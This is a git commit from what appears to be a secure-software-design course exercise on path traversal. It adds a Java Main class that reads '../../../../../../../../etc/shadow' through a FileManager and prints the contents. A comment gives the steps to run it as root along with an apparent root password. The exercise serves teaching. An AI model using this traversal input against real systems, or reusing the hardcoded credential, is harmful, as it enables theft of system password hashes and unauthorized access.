51476a57151833ef877326f5e4c20bcf824c8963
egon.teiniker <egon.teiniker@1e180149-9672-02dd-e6c9-76f92baa73ab>
2015-06-18 17:57:39 +0000

    Added Main class to start attack from command line.

---
+++ secure-software-design/6_DataStores/PathTraversal-Attack-Exercise/src/main/java/org/se/lab/Main.java
@@ -0,0 +1,19 @@
+package org.se.lab;
+
+import java.io.IOException;
+
+public class Main
+{
+	/*
+	 * $ su
+	 * root66
+	 * 
+	 * # java -cp ./target/classes/ org.se.lab.Main
+	 */	
+	public static void main(String[] args) throws IOException
+	{
+		FileManager handler = new FileManager();		
+		String txt = handler.readFile("../../../../../../../../etc/shadow");
+		System.out.println(txt);		
+	}
+}
